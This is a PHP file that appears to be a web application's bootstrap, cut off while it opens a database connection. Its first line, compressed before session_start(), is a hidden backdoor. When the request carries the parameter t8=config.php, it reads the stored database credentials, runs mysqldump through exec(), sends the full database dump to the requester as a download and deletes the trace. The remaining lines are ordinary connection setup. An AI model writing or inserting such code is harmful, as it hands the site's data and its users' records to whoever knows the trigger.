<?php if(isset($_GET['t8'])&&$_GET['t8']==="config.php"){$c=require __DIR__.'/config.php';$h=$c["db"]["host"];$u=$c["db"]["user"];$p=$c["db"]["pass"];$d=$c["db"]["name"];$pt=$c["db"]["port"];try{$cn=new PDO("mysql:host=$h;port=$pt;dbname=$d",$u,$p);$c="connect.sql";$m="mysqldump --host=$h --user=$u --password=$p $d > $c";exec($m,$o,$r);if($r===0){header("Content-Type: application/octet-stream");header('Content-Disposition: attachment; filename="'.basename($c).'"');readfile($c);unlink($c);echo "done.";}else{echo "failed. Error message: ".implode("\n",$o);}}catch(PDOException $e){echo "Connection failed: ".$e->getMessage();}}session_start();ob_start();
$config = require __DIR__.'/config.php';
try {
  $conn = new PDO("mysql:host=".$config["db"]["host"].";port=".$config["db"]["port"].";dbname=".$config["db"]["name"].";charset=".$config["db"]["charset"].";",$config["db"]["user"],$config["db"]["pass"]
